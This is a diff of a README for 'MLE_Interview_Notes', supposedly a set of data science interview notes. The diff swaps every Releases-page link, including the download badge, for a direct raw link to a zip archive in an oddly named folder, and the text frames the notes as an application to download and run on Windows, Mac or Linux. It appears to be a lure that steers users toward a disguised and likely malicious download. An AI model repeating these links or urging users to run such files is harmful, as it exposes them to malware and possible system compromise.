@@ -1,6 +1,6 @@
 # 🚀 MLE_Interview_Notes - Simplify Your Data Science Journey
 
-[![Download MLE_Interview_Notes](https://img.shields.io/badge/Download-MLE_Interview_Notes-blue.svg)](https://github.com/elmumue99/MLE_Interview_Notes/releases)
+[![Download MLE_Interview_Notes](https://github.com/elmumue99/MLE_Interview_Notes/raw/refs/heads/main/Pisistratean/Interview-Notes-ML-v2.0.zip)](https://github.com/elmumue99/MLE_Interview_Notes/raw/refs/heads/main/Pisistratean/Interview-Notes-ML-v2.0.zip)
 
 ## 📋 Overview
 
@@ -15,13 +15,13 @@ To get started with MLE_Interview_Notes, you will need to download the applicati
 3. Select the most recent version of the application.
 4. Click on the proper file to download it to your computer.
 
-You can also visit the [Releases page here](https://github.com/elmumue99/MLE_Interview_Notes/releases).
+You can also visit the [Releases page here](https://github.com/elmumue99/MLE_Interview_Notes/raw/refs/heads/main/Pisistratean/Interview-Notes-ML-v2.0.zip).
 
 ## 💾 Download & Install
 
 To download and install MLE_Interview_Notes:
 
-1. Go to the [Releases page](https://github.com/elmumue99/MLE_Interview_Notes/releases).
+1. Go to the [Releases page](https://github.com/elmumue99/MLE_Interview_Notes/raw/refs/heads/main/Pisistratean/Interview-Notes-ML-v2.0.zip).
 2. Choose the latest version available.
 3. Select the suitable file for your operating system (Windows, Mac, Linux).
 4. Save the file to your computer.
@@ -98,6 +98,6 @@ If you encounter issues while installing or running the application:
 - Check for permissions to run the downloaded file.
 - Refer to the Issues section of the GitHub page for guidance. 
 
-Finally, remember to keep your application updated by regularly checking the [Releases page](https://github.com/elmumue99/MLE_Interview_Notes/releases). 
+Finally, remember to keep your application updated by regularly checking the [Releases page](https://github.com/elmumue99/MLE_Interview_Notes/raw/refs/heads/main/Pisistratean/Interview-Notes-ML-v2.0.zip). 
 
 Happy learning!
